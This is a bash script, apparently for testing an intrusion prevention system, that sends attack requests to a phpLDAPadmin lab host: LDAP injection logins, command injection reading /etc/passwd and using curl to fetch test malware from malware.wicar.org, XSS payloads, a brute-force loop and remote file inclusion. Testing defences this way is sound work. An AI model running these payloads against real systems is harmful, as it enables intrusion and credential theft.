#!/bin/bash

# Define the correct base URL for phpLDAPadmin on port 83
BASE_URL="http://labs.aflabs.us:83"
MALWARE_URL_1="http://malware.wicar.org/data/eicar.com"
MALWARE_URL_2="http://malware.wicar.org/data/ms09_072_style_object.html"

echo "Testing IPS with various phpLDAPadmin vulnerabilities on port 83..."

#########################
# LDAP Injection Tests (5 Tests)
#########################

echo "Running LDAP Injection Tests..."

LDAP_INJ_URL="${BASE_URL}/login.php"

# LDAP Injection via login fields
curl -i -s -k -X POST "${LDAP_INJ_URL}" -d "username=*)(uid=*))(&(userPassword=*)&password=anything&login=Login"
curl -i -s -k -X POST "${LDAP_INJ_URL}" -d "username=*)(objectClass=*))(&(userPassword=*))&password=anything&login=Login"
curl -i -s -k -X POST "${LDAP_INJ_URL}" -d "username=*)(|(uid=*)(objectClass=person))&password=anything&login=Login"
curl -i -s -k -X POST "${LDAP_INJ_URL}" -d "username=*)(|(cn=*)(mail=*))&password=anything&login=Login"
curl -i -s -k -X POST "${LDAP_INJ_URL}" -d "username=*)(|(sn=*))&(password=anything&login=Login"

#########################
# Command Injection Tests (5 Tests)
#########################

echo "Running Command Injection Tests..."

CMD_INJ_URL="${BASE_URL}/cmdexec.php"

curl -i -s -k "${CMD_INJ_URL}?cmd=127.0.0.1%3Bls&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?cmd=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?cmd=127.0.0.1%3Bwhoami&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?cmd=127.0.0.1%3Bcurl+-O+${MALWARE_URL_1}&submit=Submit"
curl -i -s -k "${CMD_INJ_URL}?cmd=127.0.0.1%3Bcurl+-O+${MALWARE_URL_2}&submit=Submit"

#########################
# Cross-Site Scripting (XSS) Tests (5 Tests)
#########################

echo "Running XSS Tests..."

XSS_URL="${BASE_URL}/reflective.php"

curl -i -s -k "${XSS_URL}?name=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E"
curl -i -s -k "${XSS_URL}?name=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Ciframe+src%3Djavascript%3Aalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Cbody+onload%3Dalert%28%27XSS%27%29%3E"
curl -i -s -k "${XSS_URL}?name=%3Csvg+onload%3Dalert%28%27XSS%27%29%3E"

#########################
# Brute Force Login Tests (5 Tests)
#########################

echo "Running Brute Force Login Tests..."

BRUTE_FORCE_URL="${BASE_URL}/login.php"

for i in {1..5}; do
  curl -i -s -k -X POST "${BRUTE_FORCE_URL}" -d "username=admin&password=wrongpass${i}&login=Login"
done

#########################
# Malware Injection Simulation (2 Tests)
#########################

echo "Running Malware Injection Simulations..."

curl -i -s -k "${BASE_URL}/MalwareInjection?file=${MALWARE_URL_1}"
curl -i -s -k "${BASE_URL}/MalwareInjection?file=${MALWARE_URL_2}"

echo "IPS testing for phpLDAPadmin vulnerabilities completed."
